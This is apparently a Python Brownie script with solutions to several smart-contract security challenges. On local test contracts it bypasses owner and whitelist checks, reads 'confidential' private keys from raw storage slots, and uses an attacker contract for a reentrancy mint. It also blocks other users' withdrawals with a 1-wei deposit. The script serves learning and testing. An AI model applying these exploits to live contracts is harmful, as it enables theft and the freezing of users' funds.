from brownie import Contract, network, accounts, RoadClosed, Confidential, safeNFT, VIP_Bank, nft_hack, web3

DECIMALS = 10**18


def hack_road():
    # Contract owner
    owner = accounts[0]

    # hack3r
    hack3r = accounts[1]

    # Deploy the contract
    instance = RoadClosed.deploy({'from': owner})

    # bypasse method with elevated privileges
    instance.addToWhitelist(hack3r, {'from': hack3r})

    # change the owner after whitelisting
    instance.changeOwner(hack3r, {'from': hack3r})

    # perform the hack
    instance.pwn(hack3r, {'from': hack3r})

    # print hacked value
    print(instance.isHacked())


def hack_confidential():
    # Contract owner
    owner = accounts[0]

    # hack3r
    hack3r = accounts[1]

    # Deploy the contract
    instance = Confidential.deploy({'from': owner})

    # Connect to the Ethereum network
    web3.connect('http://localhost:8545')

    # Get the storage at the specified address
    storage_value_0 = web3.eth.get_storage_at(instance.address, 0, "latest")
    storage_value_1 = web3.eth.get_storage_at(instance.address, 1, "latest")
    storage_value_2 = web3.eth.get_storage_at(instance.address, 2, "latest")
    storage_value_3 = web3.eth.get_storage_at(instance.address, 3, "latest")
    storage_value_4 = web3.eth.get_storage_at(instance.address, 4, "latest")
    storage_value_5 = web3.eth.get_storage_at(instance.address, 5, "latest")
    storage_value_6 = web3.eth.get_storage_at(instance.address, 6, "latest")
    storage_value_7 = web3.eth.get_storage_at(instance.address, 7, "latest")
    storage_value_8 = web3.eth.get_storage_at(instance.address, 8, "latest")

    # The returned value is a bytes object, which you can decode to a hex string
    zero = storage_value_0.hex()
    two = storage_value_2.hex()

    three = storage_value_3.hex()
    five = storage_value_5.hex()
    seven = storage_value_6.hex()
    eight = storage_value_8.hex()

    alice = bytes.decode(bytes.fromhex(zero[2:]), "UTF-8").replace("\x00", "").replace("\n", "")
    alice_private_key = bytes.decode(bytes.fromhex(two[2:]), "UTF-8").replace("\x00", "").replace("\n", "")
    alice_data = bytes.decode(bytes.fromhex(three[2:]), "UTF-8").replace("\x00", "").replace("\n", "")

    bob = bytes.decode(bytes.fromhex(five[2:]), "UTF-8").replace("\x00", "").replace("\n", "")
    bob_private_key = bytes.decode(bytes.fromhex(seven[2:]), "UTF-8").replace("\x00", "").replace("\n", "")
    bob_data = bytes.decode(bytes.fromhex(eight[2:]), "UTF-8").replace("\x00", "").replace("\n", "")

    # prints Alice
    print(alice)

    # prints Alice Secret Key
    print(alice_private_key)
    print(len(alice_private_key))

    # prints alice data
    print(alice_data)

    # prints Bob
    print(bob)

    # prints bob Secret Key
    print(bob_private_key)

    # prints bob data
    print(bob_data)


def hack_safeNFT():
    # Contract owner
    owner = accounts[0]

    # hack3r
    hack3r = accounts[1]

    # Deploy the contract
    nft_price = 0.01 * DECIMALS

    instance = safeNFT.deploy("ToBeHacked NFT", "TBH", nft_price, {'from': owner})
    print(f'Deployed safeNFT address: {instance.address}')

    nft_hack_instance = nft_hack.deploy(instance.address, {'from': hack3r})
    print(f'Deployed safeNFT address: {nft_hack_instance.address}')

    # Buy an NFT
    nft_hack_instance.buy({"from": hack3r, "value": nft_price})
    # Claim NFT while trigger the hack
    nft_hack_instance.claim({"from": hack3r})

    print("Smart Contract balance in NFT Tokens")

    # Claim NFT while trigger the reentrancy hack
    print(instance.balanceOf(nft_hack_instance.address))


def vip_bank_hack():
    # Contract owner
    owner = accounts[0]

    # hack3r
    hack3r = accounts[1]
    # Alice
    alice = accounts[2]

    # Deploy the contract
    nft_price = 0.01 * 10**18
    print(nft_price)
    instance = VIP_Bank.deploy({'from': owner})

    # Add the alice and  hacker as VIP to be use the bank.
    instance.addVIP(alice.address, {'from': owner})
    instance.addVIP(hack3r.address, {'from': owner})

    # users deposit in the bank
    deposit_amount = 0.05*DECIMALS
    for i in range(10):
        instance.deposit({'from': alice, "value": deposit_amount})

    # Hacker deposits 1 wei and blocks withdraws
    instance.deposit({'from': hack3r, "value": 1})

    # Alice tries to withdraw her funds but fails
    instance.withdraw(1, {'from': alice})


def main():
    hack_confidential()
    # hack_safeNFT()
    # vip_bank_hack()


main()
